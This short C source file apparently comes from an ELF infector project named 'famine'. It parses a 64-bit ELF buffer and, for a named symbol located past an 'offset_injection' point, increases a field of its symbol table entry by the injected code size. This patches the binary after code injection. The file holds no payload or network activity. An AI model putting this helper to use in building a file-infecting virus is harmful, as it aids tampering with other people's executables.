#include "../include/famine.h"

size_t get_symbol_header_offset(int index, struct ELFheaders64 elfHeader, struct sheaders64 *sheaders) {
    size_t begin = 0;
    size_t offset = 0;

    for (int i = 0; i < elfHeader.e_shnum; i++) {
        if (sheaders[i].sh_type == 0x02) {
            begin = sheaders[i].sh_offset;
            break;
        }
    }
    offset = begin + sizeof(struct Elf64_Sym) * index;
    return (offset);
}

void    change_symbole_size(size_t offset_injection, size_t code_size, char *sym, unsigned char *buf) {
    struct Elf64_Sym *syms;
    size_t size = 0;
    size_t offset;
    char *name;
    struct ELFheaders64 elfheader;
    struct sheaders64 *sheaders;
    
    elfheader = get_elfHeader64_little_endian(buf);
    sheaders = get_section_headers_64(buf, elfheader);

    syms = get_syms_64(elfheader, sheaders, buf, &size);
    for (size_t i = 0; i < size; i++) {
      if ((syms[i].st_name != 0 || i == 0)) {
        name = get_sym_name_64(buf, elfheader, sheaders, syms[i].st_name);
        if (name && strcmp(name, sym) == 0) {
            offset = get_symbol_header_offset(i, elfheader, sheaders);
            if (syms[i].st_value > offset_injection)
                additionSurOctets(&(buf[offset + 0x10]), 8, code_size);

        }
        free(name);
      }
    }
    free(syms);
    free(sheaders);
}